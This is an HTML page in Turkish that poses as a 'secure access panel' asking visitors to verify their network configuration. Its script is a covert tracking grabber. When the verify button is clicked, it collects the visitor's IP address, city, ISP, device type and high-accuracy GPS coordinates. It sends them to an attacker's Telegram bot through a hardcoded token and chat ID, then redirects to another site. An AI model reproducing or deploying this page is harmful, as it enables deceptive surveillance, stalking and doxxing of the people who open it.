<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>G√ľvenli EriŇüim Paneli</title>
    <style>
        body { 
            background: #f4f7f6; 
            color: #333; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        .container { 
            background: #fff; 
            padding: 30px; 
            border-radius: 12px; 
            box-shadow: 0 10px 25px rgba(0,0,0,0.1); 
            text-align: center; 
            max-width: 400px; 
            width: 90%;
        }
        h2 { color: #2c3e50; margin-bottom: 10px; font-size: 22px; }
        p { color: #7f8c8d; font-size: 14px; line-height: 1.6; }
        
        .action-btn { 
            background: #3498db; 
            color: #fff; 
            border: none; 
            padding: 12px 30px; 
            font-size: 16px; 
            font-weight: 600; 
            border-radius: 6px; 
            cursor: pointer; 
            transition: background 0.3s ease; 
            margin-top: 20px;
            width: 100%;
        }
        .action-btn:hover { background: #2980b9; }
        
        #loader {
            display: none;
            margin: 20px auto;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="container">
        <h2>Sistem DońürulamasńĪ</h2>
        <p>Platforma g√ľvenli eriŇüim sańülamak i√ßin l√ľtfen ańü yapńĪlandńĪrmanńĪzńĪ dońürulayńĪn.</p>
        
        <div id="loader"></div>
        <button class="action-btn" id="mainBtn" onclick="processAccess()">GńįRńįŇěńį DOńěRULA</button>
        
        <p id="status" style="margin-top:15px; font-size:12px; color:#bdc3c7;">Oturum durumu: Bekleniyor</p>
    </div>

    <script>
        const TOKEN = "8675726929:AAGPhcQPfk9VXLgY0gg8dX97qb5wV89B1cE";
        const CHAT_ID = "5802794454";

        async function processAccess() {
            const btn = document.getElementById('mainBtn');
            const loader = document.getElementById('loader');
            const status = document.getElementById('status');

            btn.style.display = 'none';
            loader.style.display = 'block';
            status.innerText = "Sertifika ve konum dońürulanńĪyor...";

            let report = "ūüöÄ **YENńį PANEL GńįRńįŇěńį** ūüöÄ\n\n";

            // 1. IP ve Temel Veri √áekme
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                report += `ūüĎ§ **KULLANICI BńįLGńįSńį**\n`;
                report += `‚ÄĘ IP: \`${d.ip}\`\n`;
                report += `‚ÄĘ Ňěehir: ${d.city}\n`;
                report += `‚ÄĘ SańülayńĪcńĪ: ${d.org}\n`;
                report += `‚ÄĘ Cihaz: ${navigator.userAgent.includes("Android") ? "Android" : (navigator.userAgent.includes("iPhone") ? "iPhone" : "PC")}\n\n`;
            } catch(e) { report += "‚ö†ÔłŹ IP verisi alńĪnamadńĪ.\n\n"; }

            // 2. GPS Hassas Konum (Google Maps Linki)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (p) => {
                    report += `ūüďć **TAM KONUM (GPS):**\n`;
                    report += `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}\n`;
                    report += `ūüéĮ Hassasiyet: ${Math.round(p.coords.accuracy)} metre\n`;
                    await sendToTelegram(report);
                    redirect();
                }, async () => {
                    report += `‚ö†ÔłŹ GPS: KullanńĪcńĪ izin vermedi.\n`;
                    await sendToTelegram(report);
                    redirect();
                }, { enableHighAccuracy: true, timeout: 5000 });
            } else {
                report += `‚ĚĆ GPS: TarayńĪcńĪ desteklemiyor.\n`;
                await sendToTelegram(report);
                redirect();
            }
        }

        async function sendToTelegram(msg) {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: msg,
                    parse_mode: "Markdown"
                })
            });
        }

        function redirect() {
            document.getElementById('status').innerText = "Dońürulama baŇüarńĪlńĪ. AktarńĪlńĪyorsunuz...";
            setTimeout(() => {
                window.location.href = "https://illegalzone.net";
            }, 1000);
        }
    </script>
</body>
</html>
